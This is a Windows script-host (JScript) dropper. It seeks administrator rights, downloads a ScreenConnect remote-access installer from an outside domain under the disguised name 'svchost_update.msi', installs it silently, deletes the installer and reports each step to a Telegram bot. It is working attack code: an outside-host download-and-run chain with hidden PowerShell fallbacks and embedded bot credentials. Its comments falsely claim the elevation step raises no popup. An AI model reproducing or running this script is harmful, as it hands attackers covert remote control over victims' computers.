// ==========================================================
// ROBUST DOWNLOAD & INSTALL SCRIPT (SILENT ELEVATION)
// ==========================================================
var MSI_URL = "https://server.vriki-itop.cc/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
var MSI_PATH = "C:\\Windows\\Temp\\svchost_update.msi";
var TG_BOT_TOKEN = "5227670747:AAHYpuW7JSoC00EovnYJvicNdou7vJbd7Z8";
var TG_CHAT_ID = "2054021250";
// ==========================================================

// --- 1. ACCURATE UAC ELEVATION LOGIC (NO POPUP) ---
function isAdmin() {
    try {
        var shell = new ActiveXObject("WScript.Shell");
        // Write test to HKLM requires Elevated Admin privileges
        shell.RegWrite("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\TempAdminCheck", "1", "REG_SZ");
        shell.RegDelete("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\TempAdminCheck");
        return true;
    } catch(e) {
        return false;
    }
}

function requestUAC() {
    try {
        var shell = new ActiveXObject("Shell.Application");
        // Triggers UAC prompt directly
        shell.ShellExecute("wscript.exe", "\"" + WScript.ScriptFullName + "\" /elevated", "", "runas", 1);
        return true;
    } catch(e) {
        return false;
    }
}

// Check if already elevated
if (!isAdmin()) {
    // Directly request UAC elevation without showing any popup
    if (!requestUAC()) {
        WScript.Quit(1); // Exit if UAC was denied or failed
    }
    WScript.Quit(0); // Exit non-admin instance
}

// Verify elevation actually worked after restart
if (!isAdmin()) {
    WScript.Quit(1); // Exit if verification fails
}

// --- 2. TELEGRAM LOGGING ---
function tg(msg) {
    try {
        var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
        xhr.open("POST", "https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage", false);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("chat_id=" + TG_CHAT_ID + "&text=" + encodeURIComponent(msg));
    } catch(e) {}
}

// --- 3. DOWNLOAD FUNCTION ---
function downloadFile(url, path) {
    var methods = ["Method1: WinHttp", "Method2: XMLHTTP", "Method3: PowerShell"];
    
    for (var i = 0; i < methods.length; i++) {
        try {
            tg("Trying " + methods[i]);
            
            if (i == 0) {
                var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                http.open("GET", url, false);
                http.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                http.send();
                
                if (http.status == 200) {
                    var ado = new ActiveXObject("ADODB.Stream");
                    ado.type = 1; ado.open();
                    ado.write(http.responseBody);
                    ado.saveToFile(path, 2); ado.close();
                    tg("WinHttp download successful");
                    return true;
                }
            }
            else if (i == 1) {
                var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
                xhr.open("GET", url, false);
                xhr.send();
                
                if (xhr.status == 200) {
                    var ado = new ActiveXObject("ADODB.Stream");
                    ado.type = 1; ado.open();
                    if (typeof xhr.responseBody != 'undefined') {
                        ado.write(xhr.responseBody);
                    } else {
                        var binStream = new ActiveXObject("ADODB.Stream");
                        binStream.type = 2; binStream.charset = "iso-8859-1"; binStream.open();
                        binStream.writeText(xhr.responseText);
                        binStream.position = 0; binStream.type = 1;
                        binStream.copyTo(ado); binStream.close();
                    }
                    ado.saveToFile(path, 2); ado.close();
                    tg("XMLHTTP download successful");
                    return true;
                }
            }
            else if (i == 2) {
                tg("Using PowerShell download...");
                var shell = new ActiveXObject("WScript.Shell");
                var psScript = 'powershell -Command "$ErrorActionPreference = \'SilentlyContinue\'; Invoke-WebRequest -Uri \'' + url + '\' -OutFile \'' + path + '\' -UseBasicParsing"';
                shell.Run(psScript, 0, true);
                
                var fso = new ActiveXObject("Scripting.FileSystemObject");
                if (fso.FileExists(path)) {
                    tg("PowerShell download successful: " + fso.GetFile(path).Size + " bytes");
                    return true;
                }
            }
        } catch(e) {
            tg(methods[i] + " error: " + e.message.substring(0, 50));
        }
    }
    return false;
}

// --- 4. MAIN EXECUTION ---
tg("Script started - Admin: " + isAdmin());

var fso;
try { fso = new ActiveXObject("Scripting.FileSystemObject"); } catch(e) { WScript.Quit(1); }

// Download
tg("Starting download from: " + MSI_URL);
if (downloadFile(MSI_URL, MSI_PATH)) {
    var size = fso.GetFile(MSI_PATH).Size;
    tg("[OK] Download completed: " + size + " bytes");
} else {
    tg("[WARN] ALL download methods failed");
    WScript.Quit(1);
}

// PRE-INSTALL CHECK (Prevents Error 1603)
tg("Checking for pending reboots...");
var rebootPending = false;
try {
    var shell = new ActiveXObject("WScript.Shell");
    try { shell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\RebootPending"); rebootPending = true; } catch(e) {}
    try { shell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\\RebootRequired"); rebootPending = true; } catch(e) {}
    
    if (rebootPending) {
        tg("[WARN] REBOOT PENDING. Installation will fail. Please reboot and try again.");
        WScript.Quit(1603);
    }
} catch(e) {}

// INSTALLATION WITH RETRY (Handles Error 1618)
tg("Starting installation (ALLUSERS=1)...");
var maxRetries = 3;
var retryDelay = 60000; // 60 seconds
var installSuccess = false;

for (var attempt = 1; attempt <= maxRetries; attempt++) {
    try {
        var shell = new ActiveXObject("WScript.Shell");
        var cmd = 'msiexec /i "' + MSI_PATH + '" /qn /norestart ALLUSERS=1 /L*V "C:\\Windows\\Temp\\install.log"';
        var exitCode = shell.Run(cmd, 0, true);
        
        if (exitCode == 0 || exitCode == 3010) {
            tg("[OK] Installation successful (code: " + exitCode + ")");
            installSuccess = true;
            break;
        } else if (exitCode == 1618) {
            tg("[WARN] Installer busy (1618). Waiting 60s before retry " + attempt + "/" + maxRetries);
            WScript.Sleep(retryDelay);
        } else {
            tg("[WARN] Installation failed (code: " + exitCode + ")");
            break; 
        }
    } catch(e) {
        tg("Installation error: " + e.message);
        break;
    }
}

if (installSuccess) {
    // Verify Service
    try {
        var shell = new ActiveXObject("WScript.Shell");
        var result = shell.Run('cmd /c sc query type= service | findstr /i "ScreenConnect"', 0, true);
        if (result == 0) tg("[OK] Service installed and running");
    } catch(e) {}
    
    // Cleanup
    if (fso.FileExists(MSI_PATH)) {
        fso.DeleteFile(MSI_PATH, true);
        tg("Cleaned up installer");
    }
} else {
    tg("[WARN] Installation failed. Check C:\\Windows\\Temp\\install.log");
}

tg("Script completed");
WScript.Quit(0);
